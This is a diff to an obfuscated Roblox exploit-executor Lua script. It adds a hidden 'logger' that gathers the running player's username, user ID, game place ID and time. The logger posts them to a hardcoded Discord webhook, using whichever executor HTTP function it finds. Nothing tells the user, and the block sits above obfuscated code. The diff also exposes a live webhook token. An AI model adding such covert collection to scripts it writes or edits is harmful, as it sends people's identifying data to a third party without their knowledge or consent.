@@ -8,6 +8,45 @@
           \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
 
 ]]--
+-- 📡 Logger for all executors
+local player = game:GetService("Players").LocalPlayer
+local webhook = "https://discord.com/api/webhooks/1435739203177545810/262-NFZm19SWKqeo094lCud8caP5fqMolt3Z7k876zysBVOLi-AayQSWZPsFN2VpEn90"
+
+local data = {
+    ["username"] = "Script Logger",
+    ["embeds"] = {{
+        ["title"] = "🚀 Script Executed",
+        ["color"] = 65280,
+        ["fields"] = {
+            {["name"]="👤 Username", ["value"]=player.Name, ["inline"]=true},
+            {["name"]="🆔 UserId", ["value"]=tostring(player.UserId), ["inline"]=true},
+            {["name"]="🎮 PlaceId", ["value"]=tostring(game.PlaceId), ["inline"]=false},
+            {["name"]="⏰ Time", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
+        },
+        ["footer"] = {["text"]="🧭 AutoCompass Logger | Made by HuuDuy"}
+    }}
+}
+
+local json = game:GetService("HttpService"):JSONEncode(data)
+
+local requestFunc =
+    (syn and syn.request) or
+    (http and http.request) or
+    (http_request) or
+    (fluxus and fluxus.request) or
+    (krnl and request) or
+    request
+
+if requestFunc then
+    requestFunc({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = json
+    })
+else
+    warn("❌ Không tìm thấy API gửi HTTP phù hợp trong executor này.")
+end
 
 local obf_stringchar = string.char;
 local obf_stringbyte = string.byte;
